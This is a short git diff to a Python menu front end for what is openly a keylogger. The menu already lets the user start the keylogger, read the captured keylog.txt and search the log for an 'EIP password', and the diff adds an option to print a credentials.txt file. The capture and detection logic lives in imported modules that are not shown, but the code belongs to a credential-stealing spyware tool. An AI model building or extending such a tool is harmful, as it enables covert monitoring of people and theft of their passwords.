@@ -1,6 +1,6 @@
 #!/bin/python3.10
 
-from credentials import detectEIPassword
+from credentials import detectEIPassword, readCredentials
 from keylogger import KeyLogger
 from keyUtils import readLogs
 
@@ -19,7 +19,8 @@ class Menu:
         1) Start Keylogger
         2) Read keylog.txt
         3) Find EIP Password
-        4) Exit
+        4) Read credentials.txt
+        5) Exit
         """)
                 selectedMenu = int(input("Select menu option > "))
             except:
@@ -39,6 +40,9 @@ class Menu:
                     print("Looking for EIP credentials in keylog file...")
                     detectEIPassword()
                 elif(selectedMenu == 4):
+                    print("credentials.txt file content:")
+                    readCredentials()
+                elif(selectedMenu == 5):
                     print("Exiting keylogger...")
                     exitMenu = True
                 else:
